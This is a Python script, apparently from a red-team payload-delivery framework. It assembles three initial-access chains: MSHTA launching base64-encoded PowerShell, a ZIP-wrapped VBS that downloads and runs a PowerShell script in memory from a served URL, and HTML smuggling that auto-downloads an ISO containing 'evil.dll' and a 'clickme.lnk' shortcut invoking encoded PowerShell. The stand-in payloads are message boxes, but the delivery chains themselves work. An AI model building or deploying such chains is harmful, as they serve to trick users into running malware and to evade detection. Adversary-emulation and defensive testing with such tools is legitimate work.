from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
from make.lnk.lnk import makeLnk
from make.iso.iso import makeIso
from make.powershell.powershell import *
from make.zip.zip import makeZip
from make.vbs.vbs import *
from make.mshta.mshta import *

from helpers import readFileContent, saveAceFile, makeAceFile
from model import AceFile, AceRoute
from web import serve

def recepi_3():
    # MSHTA -> Powershell:MessageBox
    routes = []

    # PS-A
    ps1msgbox = makePowershellMessageBox()
    ps1msgbox = makePowershellEncodedCommand(ps1msgbox)

    # MSHTA
    cmd = "powershell.exe -EncodedCommand {}".format(ps1msgbox)
    mshta = makeMshtaJscriptExec(cmd)

    containerServe: AceRoute = AceRoute('/test.hta', mshta, download=True, downloadName='test.hta')
    routes.append(containerServe)

    # start
    serve(routes)


def recepi_2():
    # ZIP -> VBS -> Powershell:Download+Exec <- Powershell-Messagebox
    routes = []

    # PS-A
    ps1msgbox = makePowershellMessageBox()
    ps1msgboxHtml: AceRoute = AceRoute('/ps-msgbox', ps1msgbox)
    routes.append(ps1msgboxHtml)

    # PS-B
    ps1downloader = makePowershellDownloadAndExecuteMemPs1(
        url='http://localhost:5000/ps-msgbox',
    )

    # VBS
    ps1downloader = makePowershellEncodedCommand(ps1downloader)
    vbsExec = makeVbsExecEncPs1(ps1downloader)
    vbsExecFile = makeAceFile('test.vbs', vbsExec)

    # ZIP
    container: bytes = makeZip(
        files = [
            vbsExecFile,
        ],
    )
    containerServe: AceRoute = AceRoute('/test.zip', container, download=True, downloadName='test.zip')
    routes.append(containerServe)

    # start
    serve(routes)


def recepi_1():
    # HTML Smuggling -> ISO -> ( LNK -> Powershell:Load&Exec <- DLL )

    # DLL
    dllData: bytes = readFileContent('payloads/evil.dll')
    dllFile: AceFile = makeAceFile('evil.dll', dllData)

    psMsgbox = makePowershellMessageBox()
    # LNK to powershell.exe to execute DLL
    execData: str = makePowershellEncodedCommand(
        input=psMsgbox,
    )
    lnkData: bytes = makeLnk(
        name = "clickme.lnk",
        target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        arguments = "-noexit -EncodedCommand {}".format(execData),
    )
    lnkFile: AceFile = makeAceFile('clickme.lnk', lnkData)

    # Pack DLL and LNK into ISO
    container: bytes = makeIso(
        files = [
            dllFile,
            lnkFile,
        ],
    )
    containerFile: AceFile = makeAceFile('test.iso', container)

    # HTML to serve ISO
    html: str = makeHtmlSmuggling(
        containerFile,
        template='autodownload.html',
    )

    # serve HTML
    serveHtml: AceRoute = AceRoute('/test', html)
    serve([serveHtml])
